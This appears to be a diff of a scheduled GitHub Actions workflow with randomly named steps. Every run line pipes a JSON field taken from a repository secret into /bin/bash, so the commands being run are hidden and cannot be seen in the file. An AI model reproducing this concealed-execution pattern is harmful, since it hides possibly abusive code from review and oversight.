@@ -3,34 +3,19 @@ name: peixuan19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 1/6 * * *'
+    - cron: '33 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: peixuan19871010
         env:
-          rn28327: ${{ secrets.rn28327 }}
+          uhbb17: ${{ secrets.uhbb17 }}
         run: |
-          echo $rn28327 | jq -r .rlvv0 | /bin/bash
-          echo $m82 | jq -r .pmyyc45583 | /bin/bash
-          echo $n8811 | jq -r .qpjlf6 | /bin/bash
-          echo $h34 | jq -r .ld53465 | /bin/bash
-          echo $ke39150 | jq -r .meeza7 | /bin/bash
-          echo $uv78194 | jq -r .mksc5600 | /bin/bash
-          echo $was86422 | jq -r .drh246 | /bin/bash
-          echo $ted712 | jq -r .ezq23516 | /bin/bash
-          echo $enbn59 | jq -r .eqq67315 | /bin/bash
-          echo $w4 | jq -r .jtelf85435 | /bin/bash
-          echo $qvuo01 | jq -r .ro27 | /bin/bash
-          echo $plls79506 | jq -r .f2 | /bin/bash
-          echo $sxt39105 | jq -r .h2831 | /bin/bash
-          echo $nlwsd9 | jq -r .u1097 | /bin/bash
-          echo $exsy66 | jq -r .uag87219 | /bin/bash
-          echo $v00 | jq -r .n5941 | /bin/bash
-          echo $t8 | jq -r .v38 | /bin/bash
-          echo $m1 | jq -r .dwb9 | /bin/bash
+          echo $uhbb17 | jq -r .d5336 | /bin/bash
+          echo $f105 | jq -r .nq27 | /bin/bash
+          echo $uysn56456 | jq -r .ohyjb03 | /bin/bash
+          echo $ddez8 | jq -r .ph1 | /bin/bash
 
